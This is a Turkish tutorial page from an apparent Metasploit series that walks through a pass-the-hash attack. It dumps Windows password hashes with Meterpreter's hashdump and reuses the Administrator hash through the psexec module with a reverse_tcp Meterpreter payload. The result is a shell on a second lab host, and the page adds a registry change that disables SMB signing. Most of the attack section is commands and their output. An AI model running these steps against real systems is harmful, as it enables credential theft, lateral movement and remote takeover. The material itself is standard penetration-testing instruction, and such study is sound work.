---
draft: false
title: MSF PSexec Pass the Hash
weight: 230
linkTitle: PSexec Pass the Hash
translationKey: MSF_PSexec_Pass_the_Hash
date: 2017-05-25T13:17:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: psexec modülü, bulduğunuz hash değerini parola olarak kullanmanıza olanak sağlar.
url: /tr/msf-pseexec-pass-the-hash/
featured_image: /images/metasploit.jpg
categories:
   - Metasploit Framework
tags:
   - cybersecurity
   - metasploit framework
---
psexec modülü, genellikle pentest işlemleri esnasında kullanılır. Bu modül sayesine hedef sisteme giriş yapmanız mümkün hale gelmektedir. Alışılmış kullanımda, sistemin kullanıcı adı ve parolasını elde ettiğiniz ve bunu exploit modülüne değişken olarak girmeniz yeterlidir.

Normalde izlenen yol, sistemde meterpreter shell açıldığında `fgdump`, `pwdump` veya `cachedump` komutlarıyla parola elde etmektir. Bu aramalar esnasında bulduğunuz `hash` değerleri olursa, bunları çeşitli araçlar kullanarak çözmeye ve parolaların açık halini elde etmeye çalışırız.

Oysa bazen başka bir durumla karşı karşı kalabilirsiniz. Bir sistemde `Administrator` yetkili bir oturum açtınız ve kullanıcının `hash` olarak formatlı parolasını elde ettiniz. Bu oturum açtığınız sistem üzerinden aynı ağda bulunan başka bir sisteme bağlanmak istediğinizde, `Administrator` kullanıcısının parolasını çözmenize gerek olmayabilir. Genellikle ağdaki cihazlar bu `hash` değerleri kulanarak haberleşirler. psexec modülü, bulduğunuz `hash` değerini parola olarak kullanmanıza olanak sağlar.

UYARI-1:

NTLM kullanan sistemde, bulacağınız `hash` değeri `******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c` formatındaysa, baş taraftaki `******NOPASSWORD*******` kısmını 32 adet sıfır ile değiştirerek `psexec` içine değişken olarak girmeniz gerekir. Yani değer, `00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c` şeklinde olmalıdır.

UYARI-2:

Lab ortamında, doğru hash değeri girdiğiniz halde `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` hatası alıyorsanız, hedef Windows sisteminin Registry ayarlarında `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters` içerisinde `RequireSecuritySignature` değerini `0` olarak ayarlamalısınız.

## Hashdump

Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve `post/windows/gather/hashdump` modülü ile sistemde hash değerleri bulunmak istenmektedir.

```bash
> Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1042)

meterpreter > run post/windows/gather/hashdump 

> Obtaining the boot key...
> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
> Obtaining the user list and keys...
> Decrypting user keys...
> Dumping password hashes...

Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
meterpreter >
```

Görüldüğü gibi, `RHOST: 192.168.57.131` IP adresinde bulunan Administrator kullanıcısına ait `e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c` değeri elde edilmiştir.

Şimdi bu hash değerini kullanarak `RHOST: 192.168.57.140` IP adresine oturum açmayı deneyelim. Tabii ki önceden yaptığınız taramada aynı ağda `192.168.57.140` IP adresinde ve `445` portunda `SMB` servisinin çalıştığını keşfettiğinizi kabul ediyoruz.

## psexec

Önce `msfconsole` ile Metasploit Framework başlatalım ve `psexec` modülünü yükleyelim.

```bash
root@kali:~# msfconsole

                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##
       [ metasploit v4.2.0-dev [core:4.2 api:1.0]
+ -- --[ 787 exploits - 425 auxiliary - 128 post
+ -- --[ 238 payloads - 27 encoders - 8 nops
       [ svn r14551 updated yesterday (2012.01.14)

msf > search psexec

Exploits
**========**

   Name                       Description
   ----                       -----------
   windows/smb/psexec         Microsoft Windows Authenticated User Code Execution
   windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution

msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.57.133
LHOST => 192.168.57.133
msf exploit(psexec) > set LPORT 443
LPORT => 443
msf exploit(psexec) > set RHOST 192.168.57.140
RHOST => 192.168.57.140
msf exploit(psexec) > show options

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.57.140   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPass                   no        The password for the specified username
   SMBUser  Administrator    yes       The username to authenticate as
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.57.133   yes       The local address
   LPORT     443              yes       The local port
Exploit target:

   Id  Name
   --  ----
   0   Automatic
   ```

## SMBPass

Yukarıda görüldüğü gibi `exploit/windows/smb/psexec` modülünde `SMBPass` değişkenini girmemiz gerekmektedir. `SMBPass` değişkenine elimizde bulunan hash değerini girelim ve modülü `exploit` komutuyla çalıştıralım.

```bash
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit

> Connecting to the server...
> Started reverse handler
> Authenticating as user 'Administrator'...
> Uploading payload...
> Created \KoVCxCjx.exe...
> Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
> Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
> Obtaining a service manager handle...
> Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...
> Closing service handle...
> Opening service...
> Starting the service...
> Removing the service...
> Closing service handle...
> Deleting \KoVCxCjx.exe...
> Sending stage (719360 bytes)
> Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.140:445)

meterpreter > shell
Process 3680 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
```

Gördüğünüz gibi `192.168.57.140` IP adresinde oturum açılmıştır.
